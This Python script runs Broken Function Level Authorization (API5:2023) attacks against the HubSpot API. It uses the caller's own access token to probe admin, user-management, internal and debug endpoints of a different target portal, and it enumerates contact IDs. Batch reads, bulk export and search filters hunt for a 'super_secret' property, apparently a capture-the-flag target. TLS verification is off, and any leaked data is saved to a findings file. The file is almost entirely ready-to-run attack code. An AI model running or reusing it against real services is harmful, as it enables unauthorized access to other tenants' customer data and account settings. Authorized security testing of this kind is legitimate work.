#!/usr/bin/env python3
"""
BFLA (Broken Function Level Authorization) Attacks
Based on: Security Report Section 4.4 - API5:2023 BFLA

Tests if regular user tokens can access privileged/admin functions.
BFLA occurs when APIs don't properly check user roles/permissions.
"""

import requests
import json
import os
import urllib3
from dotenv import load_dotenv

urllib3.disable_warnings()
load_dotenv()

ACCESS_TOKEN = os.getenv('HUBSPOT_ACCESS_TOKEN')
TARGET_PORTAL = os.getenv('TARGET_PORTAL_ID', '46962361')
MY_PORTAL = os.getenv('MY_PORTAL_ID', '50708459')

print("="*80)
print("BFLA (Broken Function Level Authorization) Attacks")
print("="*80)
print("\nTests if regular tokens can access privileged functions")
print("Based on API5:2023 - Broken Function Level Authorization")
print("="*80)

findings = []

# ============================================================================
# 1. PORTAL-LEVEL ADMIN ENDPOINTS
# ============================================================================

def test_portal_admin_endpoints():
    """Try to access portal admin/settings endpoints"""
    print("\n[*] Testing portal admin endpoints...")

    headers = {
        'Authorization': f'Bearer {ACCESS_TOKEN}',
        'Content-Type': 'application/json'
    }

    # Portal admin endpoints
    admin_endpoints = [
        # Portal settings
        f'https://api.hubapi.com/settings/v3/portals/{TARGET_PORTAL}',
        f'https://api.hubapi.com/integrations/v1/{TARGET_PORTAL}/settings',
        f'https://api.hubapi.com/account-info/v3/details?portalId={TARGET_PORTAL}',
        f'https://api.hubapi.com/account-info/v3/api-usage?portalId={TARGET_PORTAL}',

        # User management
        f'https://api.hubapi.com/settings/v3/users?portalId={TARGET_PORTAL}',
        f'https://api.hubapi.com/settings/v3/users/teams?portalId={TARGET_PORTAL}',

        # Portal properties
        f'https://api.hubapi.com/properties/v1/contacts/properties?portalId={TARGET_PORTAL}',
        f'https://api.hubapi.com/properties/v2/contacts/properties?portalId={TARGET_PORTAL}',

        # Internal/debug endpoints
        f'https://api.hubapi.com/portals/v1/{TARGET_PORTAL}',
        f'https://api.hubapi.com/portals/v1/{TARGET_PORTAL}/settings',
        f'https://api.hubapi.com/internal/portals/{TARGET_PORTAL}',
        f'https://api.hubapi.com/debug/portals/{TARGET_PORTAL}',
    ]

    for endpoint in admin_endpoints:
        try:
            r = requests.get(endpoint, headers=headers, verify=False, timeout=10)

            print(f"\n  {endpoint.split('hubapi.com')[1][:60]}")
            print(f"  Status: {r.status_code}")

            if r.status_code == 200:
                try:
                    data = r.json()
                    print(f"  SUCCESS - Got data!")
                    print(f"  Keys: {list(data.keys())[:5]}")

                    # Check for sensitive information
                    data_str = json.dumps(data).lower()
                    if any(term in data_str for term in ['user', 'email', 'admin', 'secret', TARGET_PORTAL]):
                        print(f"  *** CONTAINS SENSITIVE DATA ***")
                        findings.append({
                            'attack': 'Portal Admin Access',
                            'endpoint': endpoint,
                            'data': data
                        })
                except:
                    print(f"  Response: {r.text[:200]}")

        except Exception as e:
            print(f"  Error: {str(e)[:80]}")

# ============================================================================
# 2. PRIVILEGED CONTACT PROPERTIES
# ============================================================================

def test_privileged_properties():
    """Try to access privileged/internal contact properties"""
    print("\n[*] Testing privileged contact properties...")

    headers = {
        'Authorization': f'Bearer {ACCESS_TOKEN}',
        'Content-Type': 'application/json'
    }

    # Properties that might be restricted
    privileged_props = [
        'super_secret',  # The flag!
        'hs_all_owner_ids',
        'hs_analytics_source',
        'hs_email_domain',
        'hs_ip_timezone',
        'hs_legal_basis',
        'hs_marketable_status',
        'hs_predictivecontactscore',
        'hubspot_owner_id',
        'hubspot_team_id',
        'hs_user_ids_of_all_owners',
        'associatedcompanyid',
        'num_associated_deals',
        'hs_sales_email_last_replied',
        'hs_sequences_actively_enrolled_count',
        'hs_time_in_evangelist',
        'hs_analytics_first_url',
        'hs_email_optout',
        'hs_email_optout_all',
    ]

    # Try to get properties from target portal contacts
    test_ids = [1, 2, 3, 100, 1000, 10000]

    for contact_id in test_ids:
        url = f'https://api.hubapi.com/crm/v3/objects/contacts/{contact_id}'
        params = {
            'portalId': TARGET_PORTAL,
            'properties': ','.join(privileged_props)
        }

        try:
            r = requests.get(url, headers=headers, params=params, verify=False, timeout=5)

            if r.status_code == 200:
                data = r.json()
                props = data.get('properties', {})

                if props:
                    print(f"\n  Contact {contact_id}: Got {len(props)} properties")

                    # Check for super_secret
                    if 'super_secret' in props:
                        print(f"  *** FOUND super_secret: {props['super_secret']} ***")
                        findings.append({
                            'attack': 'Privileged Property Access',
                            'contact_id': contact_id,
                            'property': 'super_secret',
                            'value': props['super_secret'],
                            'data': data
                        })

                    # List what we got
                    for key, val in list(props.items())[:5]:
                        print(f"    {key}: {str(val)[:50]}")

        except Exception as e:
            pass

# ============================================================================
# 3. BATCH PRIVILEGED ACCESS
# ============================================================================

def test_batch_privileged():
    """Test batch endpoints with privileged parameters"""
    print("\n[*] Testing batch privileged access...")

    headers = {
        'Authorization': f'Bearer {ACCESS_TOKEN}',
        'Content-Type': 'application/json'
    }

    # Batch read with admin parameters
    url = 'https://api.hubapi.com/crm/v3/objects/contacts/batch/read'

    payloads = [
        # Try to read all properties including internal ones
        {
            'properties': ['super_secret', 'firstname', 'email'],
            'inputs': [{'id': str(i)} for i in range(1, 101)],
            'portalId': TARGET_PORTAL
        },
        # Try with propertiesWithHistory (admin feature?)
        {
            'properties': ['super_secret', 'firstname'],
            'propertiesWithHistory': ['super_secret'],
            'inputs': [{'id': '1'}, {'id': '2'}, {'id': '3'}],
            'portalId': TARGET_PORTAL
        },
        # Try with archived contacts (might bypass normal filters)
        {
            'properties': ['super_secret', 'firstname'],
            'inputs': [{'id': str(i)} for i in range(1, 11)],
            'portalId': TARGET_PORTAL,
            'archived': True
        },
    ]

    for i, payload in enumerate(payloads, 1):
        try:
            print(f"\n  Batch test {i}...")
            r = requests.post(url, headers=headers, json=payload, verify=False, timeout=15)
            print(f"  Status: {r.status_code}")

            if r.status_code in [200, 207]:
                data = r.json()
                results = data.get('results', [])

                if results:
                    print(f"  Got {len(results)} results")

                    for result in results:
                        props = result.get('properties', {})
                        if 'super_secret' in props:
                            print(f"  *** FOUND super_secret in contact {result['id']}: {props['super_secret']} ***")
                            findings.append({
                                'attack': 'Batch Privileged Access',
                                'payload': payload,
                                'result': result
                            })

        except Exception as e:
            print(f"  Error: {str(e)[:80]}")

# ============================================================================
# 4. ASSOCIATIONS AND RELATIONSHIPS
# ============================================================================

def test_associations():
    """Test accessing privileged associations"""
    print("\n[*] Testing privileged associations...")

    headers = {
        'Authorization': f'Bearer {ACCESS_TOKEN}',
        'Content-Type': 'application/json'
    }

    # Try to get associations for target portal contacts
    test_ids = [1, 2, 3, 100]

    for contact_id in test_ids:
        # Get all associations
        url = f'https://api.hubapi.com/crm/v3/objects/contacts/{contact_id}/associations?portalId={TARGET_PORTAL}'

        try:
            r = requests.get(url, headers=headers, verify=False, timeout=5)

            if r.status_code == 200:
                data = r.json()
                print(f"\n  Contact {contact_id} associations: {r.status_code}")
                print(f"  Data: {json.dumps(data, indent=2)[:200]}")

                findings.append({
                    'attack': 'Association Access',
                    'contact_id': contact_id,
                    'data': data
                })

        except Exception as e:
            pass

# ============================================================================
# 5. EXPORT AND BULK OPERATIONS
# ============================================================================

def test_bulk_export():
    """Test bulk export endpoints (might bypass normal auth)"""
    print("\n[*] Testing bulk export operations...")

    headers = {
        'Authorization': f'Bearer {ACCESS_TOKEN}',
        'Content-Type': 'application/json'
    }

    # Bulk/export endpoints
    export_urls = [
        f'https://api.hubapi.com/crm/v3/objects/contacts/export?portalId={TARGET_PORTAL}',
        f'https://api.hubapi.com/contacts/v1/lists/all/contacts/all?count=100&portalId={TARGET_PORTAL}',
        f'https://api.hubapi.com/crm/v3/objects/contacts?limit=100&portalId={TARGET_PORTAL}&properties=super_secret,firstname,email',
    ]

    for url in export_urls:
        try:
            print(f"\n  {url.split('hubapi.com')[1][:70]}...")
            r = requests.get(url, headers=headers, verify=False, timeout=15)
            print(f"  Status: {r.status_code}")

            if r.status_code == 200:
                try:
                    data = r.json()

                    # Check for contacts data
                    if 'results' in data or 'contacts' in data:
                        results = data.get('results') or data.get('contacts', [])
                        print(f"  Got {len(results)} contacts")

                        # Check each contact for super_secret
                        for contact in results:
                            props = contact.get('properties', {})
                            if 'super_secret' in props:
                                print(f"  *** FOUND super_secret: {props['super_secret']} ***")
                                findings.append({
                                    'attack': 'Bulk Export Access',
                                    'url': url,
                                    'contact': contact
                                })

                except:
                    print(f"  Response: {r.text[:150]}")

        except Exception as e:
            print(f"  Error: {str(e)[:80]}")

# ============================================================================
# 6. SEARCH WITH PRIVILEGED FILTERS
# ============================================================================

def test_privileged_search():
    """Test search with privileged filter operators"""
    print("\n[*] Testing privileged search filters...")

    headers = {
        'Authorization': f'Bearer {ACCESS_TOKEN}',
        'Content-Type': 'application/json'
    }

    url = f'https://api.hubapi.com/crm/v3/objects/contacts/search?portalId={TARGET_PORTAL}'

    # Privileged search payloads
    searches = [
        # Search for contacts with super_secret property
        {
            'filterGroups': [{
                'filters': [{
                    'propertyName': 'super_secret',
                    'operator': 'HAS_PROPERTY'
                }]
            }],
            'properties': ['super_secret', 'firstname', 'email'],
            'limit': 100
        },
        # Search with IS_NOT_EMPTY on super_secret
        {
            'filterGroups': [{
                'filters': [{
                    'propertyName': 'super_secret',
                    'operator': 'IS_NOT_EMPTY'
                }]
            }],
            'properties': ['super_secret', 'firstname', 'email'],
            'limit': 100
        },
        # Search with wildcard on super_secret
        {
            'filterGroups': [{
                'filters': [{
                    'propertyName': 'super_secret',
                    'operator': 'CONTAINS',
                    'value': ''
                }]
            }],
            'properties': ['super_secret', 'firstname', 'email'],
            'limit': 100
        },
    ]

    for i, payload in enumerate(searches, 1):
        try:
            print(f"\n  Privileged search {i}...")
            r = requests.post(url, headers=headers, json=payload, verify=False, timeout=10)
            print(f"  Status: {r.status_code}")

            if r.status_code == 200:
                data = r.json()
                results = data.get('results', [])

                if results:
                    print(f"  Found {len(results)} contacts")

                    for result in results:
                        props = result.get('properties', {})
                        if 'super_secret' in props:
                            print(f"  *** FOUND super_secret in {result['id']}: {props['super_secret']} ***")
                            findings.append({
                                'attack': 'Privileged Search',
                                'payload': payload,
                                'result': result
                            })

        except Exception as e:
            print(f"  Error: {str(e)[:80]}")

# ============================================================================
# MAIN EXECUTION
# ============================================================================

test_portal_admin_endpoints()
test_privileged_properties()
test_batch_privileged()
test_associations()
test_bulk_export()
test_privileged_search()

print("\n" + "="*80)
print(f"BFLA Testing Complete")
print(f"Findings: {len(findings)}")
print("="*80)

if findings:
    print("\n*** POTENTIAL BFLA VULNERABILITIES ***\n")

    for i, finding in enumerate(findings, 1):
        print(f"{i}. {finding['attack']}")
        print(f"   {json.dumps(finding, indent=3)[:400]}...")
        print()

    with open('/home/user/Hub/findings/bfla_findings.json', 'w') as f:
        json.dump(findings, f, indent=2)

    print("Saved to: findings/bfla_findings.json")
else:
    print("\nNo BFLA vulnerabilities found.")
    print("\nThis means:")
    print("  - Admin endpoints properly check user roles")
    print("  - Privileged properties are access-controlled")
    print("  - Bulk operations enforce authorization")
    print("  - Good function-level access control")
